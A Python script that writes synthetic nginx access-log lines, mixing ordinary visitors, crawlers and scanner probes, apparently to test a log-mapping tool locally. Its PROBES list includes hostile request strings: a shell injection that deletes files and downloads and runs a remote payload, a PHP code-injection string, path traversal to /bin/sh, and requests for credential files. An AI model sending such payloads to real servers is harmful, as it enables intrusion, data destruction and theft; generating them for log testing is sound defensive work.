#!/usr/bin/env python3
"""
Generates fake nginx access-log lines (people, crawlers and exploit probes)
to try the HTTP side of siege-map locally.

Usage:
    python scripts/fake_nginx_log.py [--output logs/access.log] [--rate 1.5] [--json]

    --json   write the structured format of docs/nginx-log-format.md
             (adds language and host) instead of "combined"
"""
import argparse
import json
import os
import random
import time
from datetime import datetime, timezone
from pathlib import Path

VISITOR_IPS = [
    "83.45.120.17", "88.27.10.4", "95.63.44.201", "2.139.201.8", "90.74.12.55",   # ES
    "81.2.69.160", "86.143.20.9", "92.40.13.77",                                  # UK
    "73.162.44.10", "24.6.130.21", "98.207.55.3",                                 # US
    "80.187.100.12", "91.64.3.200",                                               # DE
    "190.2.148.30", "181.46.212.15", "189.203.45.60",                             # LATAM
]
BOT_IPS = [
    "218.92.0.31", "185.220.101.34", "45.145.66.127", "104.248.45.12", "165.227.32.88",
    "89.248.167.131", "193.32.162.70", "103.99.0.110", "5.160.218.33", "51.159.34.17",
    "45.143.200.18", "194.226.49.134", "36.89.191.60", "153.125.140.34",
]

BROWSERS = [
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", 30),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0", 8),
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15", 12),
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", 8),
    ("Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0", 6),
    ("Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1", 18),
    ("Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36", 14),
    ("Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/26.0 Chrome/122.0.0.0 Mobile Safari/537.36", 5),
    ("Mozilla/5.0 (iPad; CPU OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1", 4),
]
BOT_UAS = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.2; +https://openai.com/gptbot)",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "python-requests/2.32.3", "curl/8.5.0", "Go-http-client/1.1", "zgrab/0.x",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.0.0 Safari/537.36",
    "-",
]
PAGES = ["/", "/", "/", "/about", "/proyectos", "/proyectos/siege-map", "/contacto", "/cv"]
ASSETS = ["/assets/index-a1b2c3.js", "/assets/index-d4e5f6.css", "/favicon.ico", "/img/hero.webp"]
REFERRERS = [
    ("-", 40), ("https://www.linkedin.com/feed/", 20), ("https://github.com/", 12),
    ("https://www.google.com/", 14), ("https://t.co/abc", 4), ("https://www.infojobs.net/", 4),
    ("https://duckduckgo.com/", 3),
]
LANGS = [("es-ES,es;q=0.9,en;q=0.8", 55), ("en-US,en;q=0.9", 25), ("en-GB,en;q=0.9", 8),
         ("de-DE,de;q=0.9,en;q=0.7", 5), ("pt-BR,pt;q=0.9", 4), ("fr-FR,fr;q=0.9", 3)]
PROBES = [
    "/.env", "/.env.production", "/.git/config", "/wp-login.php", "/wp-admin/setup-config.php",
    "/xmlrpc.php", "/phpmyadmin/index.php", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/cgi-bin/luci/;stok=/locale?form=country", "/actuator/gateway/routes", "/actuator/env",
    "/_ignition/execute-solution", "/HNAP1", "/GponForm/diag_Form?images/", "/boaform/admin/formLogin",
    "/remote/logincheck", "/owa/auth/logon.aspx", "/manager/html", "/solr/admin/info/system",
    "/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
    "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh", "/.aws/credentials", "/config.json", "/backup.zip",
    "/shell?cd+/tmp;rm+-rf+*;wget+http://1.2.3.4/jaws;sh+/tmp/jaws", "/server-status", "/phpinfo.php",
    "/wp-content/plugins/wp-file-manager/readme.txt", "/aaa9", "/login.rsp", "/admin", "/api/v1/pods",
]


def pick(weighted):
    items, weights = zip(*weighted)
    return random.choices(items, weights)[0]


def render(as_json, ip, method, uri, status, ua, referer, lang):
    now = datetime.now(timezone.utc).astimezone()
    if as_json:
        return json.dumps({
            "time": now.isoformat(timespec="seconds"), "ip": ip, "method": method, "uri": uri,
            "status": status, "ua": "" if ua == "-" else ua,
            "referer": "" if referer == "-" else referer, "lang": lang,
            "host": "example.com", "rt": round(random.uniform(0.001, 0.2), 3),
        })
    ts = now.strftime("%d/%b/%Y:%H:%M:%S %z")
    return f'{ip} - - [{ts}] "{method} {uri} HTTP/1.1" {status} {random.randint(200, 9000)} "{referer}" "{ua}"'


def visit(as_json):
    """A person: one page, then (usually) the files a browser fetches."""
    ip, ua, lang = random.choice(VISITOR_IPS), pick(BROWSERS), pick(LANGS)
    lines = [render(as_json, ip, "GET", random.choice(PAGES), 200, ua, pick(REFERRERS), lang)]
    if random.random() < 0.8:
        lines += [render(as_json, ip, "GET", a, 200, ua, "-", lang) for a in random.sample(ASSETS, 2)]
    return lines


def probe(as_json):
    ip, ua = random.choice(BOT_IPS), random.choice(BOT_UAS)
    if random.random() < 0.15:
        return [render(as_json, ip, "GET", "/", 200, ua, "-", "")]
    method = "POST" if random.random() < 0.1 else "GET"
    return [render(as_json, ip, method, random.choice(PROBES), random.choice([404, 404, 404, 403, 400]), ua, "-", "")]


def main():
    ap = argparse.ArgumentParser(description="Generate fake nginx access-log lines")
    ap.add_argument("--output", default="logs/access.log")
    ap.add_argument("--rate", type=float, default=1.5, help="average requests per second")
    ap.add_argument("--json", action="store_true", help="structured log format")
    ap.add_argument("--count", type=int, default=0, help="stop after N batches (0 = forever)")
    args = ap.parse_args()

    Path(os.path.dirname(args.output) or ".").mkdir(parents=True, exist_ok=True)
    print(f"Writing fake nginx lines to {args.output} (~{args.rate}/s). Ctrl+C to stop.")
    done = 0
    try:
        with open(args.output, "a") as f:
            while not args.count or done < args.count:
                for line in (visit if random.random() < 0.35 else probe)(args.json):
                    f.write(line + "\n")
                f.flush()
                done += 1
                time.sleep(random.expovariate(args.rate))
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
